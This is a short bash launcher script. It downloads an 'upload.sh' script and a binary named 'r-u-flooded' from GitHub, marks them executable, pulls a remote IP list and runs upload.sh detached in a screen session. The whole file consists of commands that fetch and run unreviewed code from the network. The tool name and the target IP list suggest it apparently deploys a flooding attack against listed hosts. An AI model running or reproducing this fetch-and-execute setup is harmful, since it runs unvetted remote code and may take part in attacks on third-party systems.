#!/usr/bin/env bash

update_list(){
	if curl -LJ https://raw.githubusercontent.com/varathongue/upload/main/list-ip.txt -o new-ip-list.txt; then
		mv new-ip-list.txt ip-list.txt
	else
		echo "couldn't download ip list"
	fi
}

if [[ ! -f 'upload.sh' ]]; then
	curl -OLJ https://raw.githubusercontent.com/varathongue/upload/main/upload.sh
	chmod +x upload.sh
fi

if [[ ! -f 'r-u-flooded' ]]; then
	curl -OLJ https://github.com/c3l3si4n/r-u-flooded/releases/download/v0.1.1/r-u-flooded
	chmod +x r-u-flooded
fi

if [[ ! -f 'ip-list.txt' ]]; then
	update_list
fi


case "$1" in
   'run')
      screen -d -S upload -m ./upload.sh
      ;;
   'update-list')
      update_list
      ;;
esac
